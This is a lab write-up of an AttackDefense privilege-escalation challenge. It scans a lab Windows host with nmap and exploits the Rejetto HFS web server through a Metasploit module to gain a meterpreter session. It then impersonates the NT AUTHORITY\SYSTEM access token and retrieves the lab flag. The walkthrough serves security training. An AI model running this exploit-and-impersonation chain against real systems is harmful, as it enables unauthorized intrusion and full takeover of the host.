# 🔬Access Token

## Lab 1 <a href="#lab-1" id="lab-1"></a>

> 🔬 [Privilege Escalation: Impersonate](https://attackdefense.com/challengedetails?cid=2353)
>
> * Target IP: `10.0.28.102`
> * **Access Token impersonation**

### Enumeration

```bash
root@attackdefense:~# nmap 10.0.28.102
Starting Nmap 7.91 ( https://nmap.org ) at 2024-07-06 11:22 IST
Nmap scan report for 10.0.28.102
Host is up (0.0018s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 5.60 seconds
```

* Determine the version information of the web server on port `80`

<figure><img src="../../../../../.gitbook/assets/image (21) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Without using `nmap`, the `http` server version can be checked in a browser by opening the link

* `http://10.0.28.102/`

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
searchsploit hfs
```

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

```bash
msfconsole -q
msf6 > search rejetto
```

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > show options
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.0.28.102
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Migrate current x86 `meterpreter` session to a x64 process

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Access is denied because current user `LOCAL SERVICE` don't have access to an privileges user account
{% endhint %}

<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This `meterpreter` session (with this particular user account) can be utilized to impersonate other access tokens available.

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

#### **Access Token Impersonation**

<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* `ATTACKDEFENSE\Administrator` account access token would provide elevated privileges

<figure><img src="../../../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Listing tokens with this account, there can be additional available tokens

<figure><img src="../../../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* `NT AUTHORITY\SYSTEM` can be impersonated, getting the privileges associated with its access token

```bash
impersonate_token "NT AUTHORITY\SYSTEM"
```

<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* In the case of no Delegation or Impersonation tokens found, the `Potato Attack` can be used to get or generate a `NT AUTHORITY/SYSTEM` access token, impersonating it and obtain privileges associated to it.
* Get the flag of the lab:

```bash
cd C:\\Users\\Administrator\\Desktop\\
```

<figure><img src="../../../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: x28c832a39730b7d46d6c38f1ea18e12
{% endhint %}

